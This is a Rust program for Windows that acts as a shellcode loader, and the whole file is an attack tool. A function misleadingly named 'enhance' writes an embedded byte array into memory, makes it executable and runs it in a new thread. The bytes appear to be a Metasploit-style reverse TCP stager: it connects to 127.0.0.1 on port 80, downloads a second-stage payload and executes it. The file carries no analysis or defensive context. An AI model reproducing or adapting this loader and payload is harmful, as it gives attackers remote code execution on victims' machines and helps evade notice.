use windows::Win32::System::Memory::VirtualAlloc;
use windows::Win32::System::Memory::VirtualProtect;
use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
use windows::Win32::System::Threading::CreateThread;
use windows::Win32::System::Threading::THREAD_CREATION_FLAGS;
use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
use windows::Win32::System::Threading::WaitForSingleObject;

fn enhance(buf:&[u8]) {
    unsafe {
        let alloc = VirtualAlloc(None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let alloc_ptr: *mut u8 = alloc as *mut u8;
        std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf.len());
        let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_EXECUTE_READ;
        VirtualProtect(alloc, buf.len(), PAGE_EXECUTE_READ, &mut old_perms,);
        let res_ct = CreateThread(None, 0, Some(std::mem::transmute(alloc)), None, THREAD_CREATION_FLAGS(0), None).unwrap();
        let _ = WaitForSingleObject(res_ct, u32::MAX);
    }
}

fn main() {

    let buf: Vec<u8> = vec![252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 81, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 86, 72, 15, 183, 74, 74, 77, 49, 201, 72, 139, 114, 80, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, 11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 139, 72, 24, 80, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 65, 88, 65, 88, 94, 72, 1, 208, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 73, 190, 119, 115, 50, 95, 51, 50, 0, 0, 65, 86, 73, 137, 230, 72, 129, 236, 160, 1, 0, 0, 73, 137, 229, 73, 188, 2, 0, 0, 80, 127, 0, 0, 1, 65, 84, 73, 137, 228, 76, 137, 241, 65, 186, 76, 119, 38, 7, 255, 213, 76, 137, 234, 104, 1, 1, 0, 0, 89, 65, 186, 41, 128, 107, 0, 255, 213, 106, 10, 65, 94, 80, 80, 77, 49, 201, 77, 49, 192, 72, 255, 192, 72, 137, 194, 72, 255, 192, 72, 137, 193, 65, 186, 234, 15, 223, 224, 255, 213, 72, 137, 199, 106, 16, 65, 88, 76, 137, 226, 72, 137, 249, 65, 186, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 73, 255, 206, 117, 229, 232, 147, 0, 0, 0, 72, 131, 236, 16, 72, 137, 226, 77, 49, 201, 106, 4, 65, 88, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 85, 72, 131, 196, 32, 94, 137, 246, 106, 64, 65, 89, 104, 0, 16, 0, 0, 65, 88, 72, 137, 242, 72, 49, 201, 65, 186, 88, 164, 83, 229, 255, 213, 72, 137, 195, 73, 137, 199, 77, 49, 201, 73, 137, 240, 72, 137, 218, 72, 137, 249, 65, 186, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 65, 87, 89, 104, 0, 64, 0, 0, 65, 88, 106, 0, 90, 65, 186, 11, 47, 15, 48, 255, 213, 87, 89, 65, 186, 117, 110, 77, 97, 255, 213, 73, 255, 206, 233, 60, 255, 255, 255, 72, 1, 195, 72, 41, 198, 72, 133, 246, 117, 180, 65, 255, 231, 88, 106, 0, 89, 73, 199, 194, 240, 181, 162, 86, 255, 213];
    enhance(&buf);
}